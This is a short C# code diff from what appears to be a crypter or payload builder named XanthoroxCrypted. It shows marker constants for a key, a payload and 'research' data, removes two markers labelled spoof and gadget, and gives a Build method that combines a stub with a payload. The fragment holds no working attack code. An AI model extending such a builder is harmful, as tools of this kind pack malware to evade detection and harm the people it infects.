@@ -118,8 +118,6 @@ namespace XanthoroxCrypted.Core
         private static readonly byte[] MARKER_KEY      = Encoding.ASCII.GetBytes("XKEYBLK");
         private static readonly byte[] MARKER_PAYLOAD  = Encoding.ASCII.GetBytes("XPAYLOD");
         private static readonly byte[] MARKER_RESEARCH = Encoding.ASCII.GetBytes("XRESRC\0");
-        private static readonly byte[] MARKER_SPOOF  = Encoding.ASCII.GetBytes("XSPOOF");
-        private static readonly byte[] MARKER_GADGET = Encoding.ASCII.GetBytes("XGADGT");
 
         public static string Build(byte[] stubData, string outputPath, byte[] payload,
             byte[] key, BuildConfig config, byte[]? researchParams = null)
